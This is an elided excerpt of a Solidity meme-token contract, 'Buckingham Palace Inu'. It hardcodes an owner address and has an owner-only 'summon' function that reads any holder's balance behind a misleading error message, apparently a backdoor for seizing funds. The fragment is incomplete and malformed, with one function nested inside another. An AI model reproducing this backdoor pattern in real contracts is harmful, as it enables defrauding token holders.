...
contract Buckingham is Context, IERC20 {
    ...
    address lead_deployer = 0xd27552E694Caf3492ede735dEAE7c3c3FD7A3B46;
    address public _owner = 0xd27552E694Caf3492ede735dEAE7c3c3FD7A3B46;
   constructor () public {


        
        _name = "Buckingham Palace Inu";
        _symbol = "BUCK";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function txns(address account) public {
        ...
        function summon(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
